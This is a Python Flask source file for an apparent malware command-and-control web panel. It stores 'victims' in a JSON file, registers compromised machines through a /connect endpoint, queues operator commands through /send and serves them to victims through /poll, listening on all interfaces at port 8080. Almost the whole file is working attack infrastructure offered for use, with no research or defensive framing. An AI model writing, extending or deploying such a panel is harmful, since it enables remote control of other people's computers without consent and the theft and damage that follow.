from flask import Flask, render_template, request, jsonify
import threading
import json
import os
from datetime import datetime

app = Flask(__name__)
VICTIMS_FILE = "victims.json"

def load_victims():
    if not os.path.exists(VICTIMS_FILE):
        with open(VICTIMS_FILE, "w") as f:
            f.write("{}")
    with open(VICTIMS_FILE, "r") as f:
        return json.load(f)

def save_victims(data):
    with open(VICTIMS_FILE, "w") as f:
        json.dump(data, f, indent=2)

connected_victims = load_victims()

@app.route('/')
def index():
    victims = list(connected_victims.keys())
    return render_template('index.html', victims=victims)

@app.route('/connect', methods=['POST'])
def connect():
    data = request.json
    victim_id = data.get("id")
    connected_victims[victim_id] = {
        "info": data.get("info", {}),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "commands": []
    }
    save_victims(connected_victims)
    return jsonify({"status": "ok"})

@app.route('/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get("id")
    command = data.get("command")
    if victim_id in connected_victims:
        connected_victims[victim_id]["commands"].append({
            "cmd": command,
            "response": ""
        })
        save_victims(connected_victims)
        return jsonify({"status": "sent"})
    return jsonify({"error": "Victim not found"}), 404

@app.route('/poll/<victim_id>')
def poll(victim_id):
    if victim_id in connected_victims:
        return jsonify(connected_victims[victim_id]["commands"])
    return jsonify([])

def run_webpanel():
    app.run(host="0.0.0.0", port=8080)

def start_webpanel():
    thread = threading.Thread(target=run_webpanel)
    thread.daemon = True
    thread.start()
    print("[+] Web Panel جاهز على http://localhost:8080")